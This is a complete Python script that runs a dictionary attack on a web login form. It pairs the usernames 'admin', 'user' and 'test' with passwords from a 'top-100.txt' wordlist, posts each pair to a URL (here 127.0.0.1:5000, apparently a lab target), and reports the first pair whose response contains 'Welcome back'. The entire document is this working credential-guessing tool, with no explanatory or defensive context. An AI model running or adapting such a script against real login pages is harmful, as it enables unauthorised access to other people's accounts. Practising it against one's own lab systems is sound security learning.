import requests
import sys

# Configuration
target_url = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
password_file = "top-100.txt"
success_message = "Welcome back"

def attempt_login(username, password):
    """Attempts to log in with the given username and password."""
    response = requests.post(target_url, data={"username": username, "password": password})
    return success_message in response.text

def main():
    try:
        with open(password_file, "r") as file:
            passwords = [line.strip() for line in file]

        for username in usernames:
            print(f"[*] Testing passwords for user: {username}")
            for password in passwords:
                sys.stdout.write(f"[X] Attempting user:password -> {username}:{password}\r")
                sys.stdout.flush()

                if attempt_login(username, password):
                    print(f"\n[>>>>>] Valid password '{password}' found for user '{username}'!")
                    return

            print(f"\n[!] No valid password found for user '{username}'.")

    except FileNotFoundError:
        print(f"[Error] Password file '{password_file}' not found.")
    except requests.RequestException as e:
        print(f"[Error] Request failed: {e}")

if __name__ == "__main__":
    main()
